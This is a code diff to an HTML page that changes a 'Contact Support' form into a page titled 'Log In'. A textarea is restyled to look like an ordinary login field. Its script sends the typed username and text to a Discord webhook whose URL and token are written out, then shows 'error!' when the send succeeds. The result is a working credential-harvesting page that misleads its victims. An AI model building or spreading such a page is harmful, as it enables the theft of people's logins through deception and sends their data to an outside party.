@@ -3,8 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contact Support</title>
+    <title>Log In</title>
     <link rel="stylesheet" href="style.css">
+    <style>
+        /* Match message box to normal input field */
+        #message {
+            height: 40px;               /* same height as your login bar */
+            resize: none;               /* can't expand */
+            overflow: hidden;           /* hide scrollbar */
+            padding-top: 10px;          
+            padding-bottom: 10px;
+            line-height: 20px;          /* clean text vertical alignment */
+        }
+    </style>
 </head>
 <body>
     <div class="login-container">
@@ -12,8 +23,11 @@
 
         <form onsubmit="sendSupportMessage(event)">
             <input type="text" id="name" class="input-field" placeholder="Username" required>
-            <textarea id="message" class="input-field" placeholder="Password" required style="height:120px;"></textarea>
-            <button type="submit" class="login-button">Log In</button>
+
+            <!-- Message bar same size & not expandable -->
+            <textarea id="message" class="input-field" placeholder="Log In" required></textarea>
+
+            <button type="submit" class="login-button">Send</button>
         </form>
 
         <p id="status"></p>
@@ -27,7 +41,7 @@
             const msg = document.getElementById("message").value;
             const status = document.getElementById("status");
 
-            const webhookURL = "https://discordapp.com/api/webhooks/1445674227133976588/ink8ID_PzKPvI6_2OaUgvo-HC7tLOtkK6khEzJUkAMEcxG69hlhzqL5f42_Bgj_0dEGi"; // <-- paste your webhook
+            const webhookURL = "https://discordapp.com/api/webhooks/1445677855475241031/Y_z73Tr0o6Od9sg0JjCrlYmrpHB4eB8h_lP-BDb7SdisFmMrDCQKzXI1WFPa5WLQcJIU"; // <-- paste your webhook
 
             const payload = {
                 content: `📩 **New Message**\n**From:** ${name}\n**Message:** ${msg}`
@@ -41,7 +55,7 @@
                 });
 
                 if (res.ok) {
-                    status.innerText = "Message sent!";
+                    status.innerText = "error!";
                     document.getElementById("name").value = "";
                     document.getElementById("message").value = "";
                 } else {
